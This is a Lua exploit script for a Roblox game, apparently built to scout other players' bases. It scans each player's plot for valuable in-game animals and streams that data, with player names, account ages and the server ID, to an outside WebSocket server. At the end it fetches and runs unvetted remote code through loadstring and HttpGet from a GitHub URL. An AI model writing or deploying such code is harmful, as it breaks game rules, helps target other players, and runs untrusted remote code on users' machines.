local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Plots = workspace:WaitForChild("Plots")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = workspace:WaitForChild("Debris")

-- Chargement des modules de données
local AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
local TraitsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Traits"))
local MutationsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Mutations"))

local invisibilityActive = false
local localPlayerInfos = nil
local server = nil
local reconnectDelay = 5
local currentWSUrl = "" -- Pour stocker l'URL en cas de reconnexion

print("🚀 [M4GIX] Script Initialisé. PlaceId:", game.PlaceId)

local function SendToServer(method, data)
    if server then
        local payload = HttpService:JSONEncode({Method = method, Data = data})
        server:Send(payload)
    else
        print("⚠️ [M4GIX] Impossible d'envoyer: Serveur non connecté.")
    end
end

-- [FONCTIONS DE CALCUL ET FORMATAGE]
-- (Gardées identiques pour la logique métier)
local function CalculGeneration(baseIncome, mutationName, traitsTable)
    local totalMultiplier = 1
    local mutConfig = MutationsData[mutationName]
    if mutConfig and mutConfig.Modifier then totalMultiplier = totalMultiplier + mutConfig.Modifier end
    for _, traitName in ipairs(traitsTable) do
        local traitConfig = TraitsData[traitName]
        if traitConfig and traitConfig.MultiplierModifier then totalMultiplier = totalMultiplier + traitConfig.MultiplierModifier end
    end
    return (baseIncome or 0) * totalMultiplier
end

local function FormatMoney(value)
    if value >= 1e12 then return string.format("$%.1fT/s", value / 1e12)
    elseif value >= 1e9 then return string.format("$%.1fB/s", value / 1e9)
    elseif value >= 1e6 then return string.format("$%.1fM/s", value / 1e6)
    elseif value >= 1e3 then return string.format("$%.1fK/s", value / 1e3)
    else return string.format("$%.1f/s", value) end
end

local function ParseGeneration(str)
    local clean = str:gsub("[%$%s/s]", ""):upper()
    local multiplier = 1
    local numStr = clean
    if clean:find("K") then multiplier = 10^3 numStr = clean:gsub("K", "")
    elseif clean:find("M") then multiplier = 10^6 numStr = clean:gsub("M", "")
    elseif clean:find("B") then multiplier = 10^9 numStr = clean:gsub("B", "")
    elseif clean:find("T") then multiplier = 10^12 numStr = clean:gsub("T", "") end
    local val = tonumber(numStr)
    return val and (val * multiplier) or 0
end

-- [LOGIQUE SCAN]
local function FindOverheadForAnimal(animalModel)
    local animalName = animalModel.Name
    local bestTemplate = nil
    local minDistance = math.huge
    for _, item in ipairs(Debris:GetChildren()) do
        if item.Name == "FastOverheadTemplate" and item:IsA("BasePart") then
            local container = item:FindFirstChild("AnimalOverhead")
            local displayNameLabel = container and container:FindFirstChild("DisplayName")
            if displayNameLabel and displayNameLabel.Text == animalName then
                local animalPos = animalModel:GetPivot().Position
                local horizontalPos = Vector3.new(animalPos.X, item.Position.Y, animalPos.Z)
                local dist = (item.Position - horizontalPos).Magnitude               
                if dist < minDistance then
                    minDistance = dist
                    bestTemplate = container
                end
            end
        end
    end
    return (bestTemplate and minDistance < 3) and bestTemplate or nil
end

local function ParseOverhead(overhead)
    if not overhead then return nil end
    local displayObj = overhead:FindFirstChild("DisplayName")
    if not displayObj or displayObj.Text == "" then return nil end
    local mutationObj = overhead:FindFirstChild("Mutation")
    local actualMutation = (mutationObj and mutationObj.Visible and mutationObj.Text ~= "") and mutationObj.Text or "Default"
    return {
        DisplayName = displayObj.Text,
        Mutation    = actualMutation,
        Generation  = overhead:FindFirstChild("Generation") and overhead.Generation.Text or "$0/s",
        Rarity      = overhead:FindFirstChild("Rarity") and overhead.Rarity.Text or "Common"
    }
end

local function GetPlot(player)
    for _, plot in ipairs(Plots:GetChildren()) do
        local label = plot:FindFirstChild("PlotSign") 
            and plot.PlotSign:FindFirstChild("SurfaceGui")
            and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
            and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
        if label then
            local t = (label.ContentText or label.Text or "")
            if t:find(player.DisplayName) and t:find("Base") then return plot end
        end
    end
    return nil
end

local function GetBrainrots(player)
    local brainrots = {}
    local plot = GetPlot(player)
    if not plot then return brainrots end
    for _, child in ipairs(plot:GetChildren()) do
        local config = AnimalsData[child.Name]
        if config then
            local overhead = FindOverheadForAnimal(child)
            local infos = ParseOverhead(overhead)
            local mutation = child:GetAttribute("Mutation") or "Default"
            local traits = {}
            local rawTraits = child:GetAttribute("Traits")
            if type(rawTraits) == "string" then
                for t in string.gmatch(rawTraits, '([^,]+)') do table.insert(traits, t:match("^%s*(.-)%s*$")) end
            end
            
            local income, incomeString = 0, ""
            if infos and infos.Generation ~= "" then
                incomeString = infos.Generation
                income = ParseGeneration(incomeString)
            else
                income = CalculGeneration(config.Generation, mutation, traits)
                incomeString = FormatMoney(income)
            end

            table.insert(brainrots, {
                Overhead = overhead,
                Model = child,
                Name = child.Name,
                IncomeStr = incomeString,
                Income = income,
                Rarity = config.Rarity or "Common",
                Mutation = mutation,
                Traits = traits
            })
        end
    end
    return brainrots
end

local function GetPlayerInfos(player)
    local Infos = {
        DisplayName  = player.DisplayName,
        Name         = player.Name,
        AccountAge   = player.AccountAge,
        UserType     = (player == Players.LocalPlayer) and "LocalPlayer" or "Player",
        Server       = { JobId = game.JobId },     
        Animals      = GetBrainrots(player)
    }
    if player == Players.LocalPlayer then localPlayerInfos = Infos end
    return Infos
end

local function SendPlayerInfos(player)
    print("📡 [M4GIX] Scan & Envoi pour: " .. player.Name)
    local infos = GetPlayerInfos(player)
    local export = {
        DisplayName = infos.DisplayName,
        Name = infos.Name,
        AccountAge = infos.AccountAge,
        UserType = infos.UserType,
        Server = infos.Server,
        Animals = {}
    }
    for _, animal in ipairs(infos.Animals) do
        table.insert(export.Animals, {
            Name = animal.Name,
            IncomeStr = animal.IncomeStr,
            Income = animal.Income,
            Rarity = animal.Rarity,
            Mutation = animal.Mutation,
            Traits = animal.Traits
        })
    end
    SendToServer("ClientInfos", export)
end

function connectWS(url)
    currentWSUrl = url
    print("🔗 [M4GIX] Tentative de connexion à: " .. url)
    
    local success, result = pcall(function()
        -- On tente WebSocket.connect (Synapse/ScriptWare) ou WebSocket.new (Vulkan/Fluxus)
        local connector = WebSocket and (WebSocket.connect or WebSocket.new)
        if not connector then error("L'exécuteur ne supporte pas les WebSockets") end
        return connector(url)
    end)

    if success and result then
        server = result
        print("✅ [M4GIX] Connecté au serveur Render !")
        
        -- Envoi initial pour tous les joueurs déjà là
        for _, player in ipairs(Players:GetPlayers()) do
            task.spawn(function() SendPlayerInfos(player) end)
        end

        -- Monitorer les nouveaux
        Players.PlayerAdded:Connect(function(p)
            task.wait(2) -- Laisser le temps au plot de charger
            SendPlayerInfos(p)
        end)

        local messageEvent = server.OnMessage or server.Message
        if messageEvent then
            messageEvent:Connect(function(msg)
                print("📩 [M4GIX] Message reçu du serveur: " .. msg)
            end)
        end

        server.OnClose:Connect(function()
            print("❌ [M4GIX] Connexion perdue. Reconnexion dans " .. reconnectDelay .. "s...")
            task.wait(reconnectDelay)
            connectWS(currentWSUrl)
        end)
    else
        print("🔴 [M4GIX] Échec connexion: " .. tostring(result))
        task.wait(reconnectDelay)
        connectWS(currentWSUrl)
    end
end

-- [LANCEUR]
local TARGET_PLACE_ID = 109983668079237 

if game.PlaceId == TARGET_PLACE_ID then
    print("🎯 [M4GIX] PlaceId correct. Lancement...")
    local serverURL = "wss://m4gix-ws.onrender.com/?role=LocalPlayer&user=" .. HttpService:UrlEncode(Players.LocalPlayer.Name)
    task.spawn(function() connectWS(serverURL) end)
else
    print("🚫 [M4GIX] PlaceId incorrect (" .. game.PlaceId .. ").")
end

-- Nameless Loadstring (Optionnel)
task.spawn(function()
    print("📦 [M4GIX] Chargement Nameless...")
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
    end)
end)
